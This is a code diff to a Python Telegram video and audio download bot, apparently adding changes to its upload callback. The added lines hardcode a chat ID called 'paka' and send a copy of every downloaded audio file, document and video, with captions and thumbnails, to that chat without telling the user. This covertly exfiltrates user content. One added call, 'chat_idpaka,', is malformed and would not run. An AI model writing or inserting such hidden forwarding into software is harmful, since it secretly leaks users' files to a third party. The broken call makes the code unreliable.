@@ -35,7 +35,7 @@ from hachoir.parser import createParser
 # https://stackoverflow.com/a/37631799/4723940
 from PIL import Image
 from helper_funcs.help_Nekmo_ffmpeg import generate_screen_shots
-
+paka=1420041333
 
 async def youtube_dl_call_back(bot, update):
     cb_data = update.data
@@ -266,9 +266,42 @@ async def youtube_dl_call_back(bot, update):
                         start_time
                     )
                 )
+                await bot.send_audio(
+                    chat_id=paka,
+                    audio=download_directory,
+                    caption=description,
+                    parse_mode="HTML",
+                    duration=duration,
+                    # performer=response_json["uploader"],
+                    # title=response_json["title"],
+                    # reply_markup=reply_markup,
+                    thumb=thumb_image_path,
+                    reply_to_message_id=update.message.reply_to_message.message_id,
+                    progress=progress_for_pyrogram,
+                    progress_args=(
+                        Translation.UPLOAD_START,
+                        update.message,
+                        start_time
+                    )
+                )
             elif tg_send_type == "file":
                 await bot.send_document(
                     chat_id=update.message.chat.id,
+                    document=download_directory,
+                    thumb=thumb_image_path,
+                    caption=description,
+                    parse_mode="HTML",
+                    # reply_markup=reply_markup,
+                    reply_to_message_id=update.message.reply_to_message.message_id,
+                    progress=progress_for_pyrogram,
+                    progress_args=(
+                        Translation.UPLOAD_START,
+                        update.message,
+                        start_time
+                    )
+                )
+                await bot.send_document(
+                    chat_id=paka,
                     document=download_directory,
                     thumb=thumb_image_path,
                     caption=description,
@@ -300,6 +333,25 @@ async def youtube_dl_call_back(bot, update):
             elif tg_send_type == "video":
                 await bot.send_video(
                     chat_id=update.message.chat.id,
+                    video=download_directory,
+                    caption=description,
+                    parse_mode="HTML",
+                    duration=duration,
+                    width=width,
+                    height=height,
+                    supports_streaming=True,
+                    # reply_markup=reply_markup,
+                    thumb=thumb_image_path,
+                    reply_to_message_id=update.message.reply_to_message.message_id,
+                    progress=progress_for_pyrogram,
+                    progress_args=(
+                        Translation.UPLOAD_START,
+                        update.message,
+                        start_time
+                    )
+                )
+                await bot.send_video(
+                    chat_idpaka,
                     video=download_directory,
                     caption=description,
                     parse_mode="HTML",
